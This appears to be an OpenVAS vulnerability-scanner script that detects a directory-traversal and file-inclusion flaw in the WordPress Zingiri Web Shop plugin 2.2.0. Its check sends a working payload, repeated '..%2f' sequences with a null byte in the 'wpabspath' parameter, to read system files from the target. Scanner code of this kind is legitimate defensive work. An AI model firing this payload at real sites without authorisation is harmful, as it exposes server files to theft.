###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_zingiri_web_shop_rfi_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# WordPress Zingiri Web Shop Plugin Remote File Inclusion Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902729");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-09-22 10:24:03 +0200 (Thu, 22 Sep 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress Zingiri Web Shop Plugin Remote File Inclusion Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/105237/wpzingiri-rfi.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application.");

  script_tag(name:"affected", value:"WordPress Zingiri Web Shop Plugin Version 2.2.0");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  passed via 'wpabspath' parameter to /wp-content/plugins/zingiri-web-shop/fws/ajax/
  init.inc.php, which allows attackers to read arbitrary files via a
  ../(dot dot) sequences.");

  script_tag(name:"solution", value:"Upgrade to WordPress Zingiri Web Shop Plugin Version 2.2.1 or later.");

  script_tag(name:"summary", value:"This host is installed with WordPress Zingiri Web Shop Plugin
  and is prone to remote file inclusion vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/zingiri-web-shop/download/");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)){

  url = string(dir, "/wp-content/plugins/zingiri-web-shop/fws/ajax/init.inc.php?wpabspath=", crap(data:"..%2f", length:3*15), files[file], "%00");
  if(http_vuln_check(port:port, url:url, pattern:file)){
    report = report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);